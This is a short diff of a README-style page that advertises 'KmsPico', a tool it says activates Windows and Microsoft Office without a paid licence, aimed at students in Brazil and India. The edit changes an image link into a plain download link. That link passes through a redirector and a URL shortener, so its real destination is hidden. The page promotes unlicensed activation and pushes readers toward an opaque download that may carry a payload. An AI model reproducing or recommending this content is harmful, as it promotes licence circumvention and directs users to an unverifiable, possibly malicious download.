@@ -2,7 +2,7 @@
 
 **KmsPico** is a unique program created specifically for students from Brazil and India, which provides the possibility of temporary or permanent activation of various versions of **Windows** and **Microsoft Office**. With its help, you can use all the functions of the operating system and office applications as if they were activated with an official license key. 
 
-**![DOWNLOAD KMSPICO STABLE](https://href.li/?https://goo.su/picokms)**
+**[DOWNLOAD KMSPICO STABLE](https://href.li/?https://goo.su/picokms)**
 
 This program will be an excellent solution for students who need full access to software for educational and professional tasks, but do not have the opportunity to purchase expensive licenses.
 
